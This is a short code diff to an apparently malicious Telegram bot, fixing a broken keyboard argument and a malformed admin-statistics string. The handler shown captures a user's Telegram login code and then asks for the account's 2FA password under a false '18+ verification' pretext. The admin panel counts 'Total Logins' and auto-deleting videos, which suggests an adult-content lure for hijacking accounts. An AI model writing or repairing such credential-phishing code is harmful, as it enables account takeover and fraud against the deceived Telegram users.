@@ -305,7 +305,9 @@ async def process_phone_code(message: types.Message, state: FSMContext):
         
     except SessionPasswordNeededError:
         # Remove keyboard and ask for 2FA
-        await message.answer("✅ **OTP Verified!**", reply_markup=remove # 2FA required message
+        await message.answer("✅ **OTP Verified!**", reply_markup=remove_keyboard)
+        
+        # 2FA required message
         await message.answer("🔐 **Telegram has sent you a 18+ verification code**\n\nPlease write your 2FA password here:", parse_mode='Markdown')
         await state.update_data(phone_number=phone_number, phone_code_hash=phone_code_hash, phone_code=phone_code)
         await state.set_state(LoginForm.waiting_for_password)
@@ -503,7 +505,7 @@ async def admin_view_stats(callback: types.CallbackQuery):
     stats_msg = (
         "📊 **Admin Statistics**\n\n"
         f"👤 Total Logins: {total_logins}\n"
-        f: {total_videos}\n"
+        f"📹 Total Videos: {total_videos}\n"
         f"🎬 Active Videos: {active_videos}\n"
         f"⏰ Auto-delete: 15 minutes\n\n"
         f"🕒 Last updated: {datetime.now().strftime('%H:%M:%S')}"
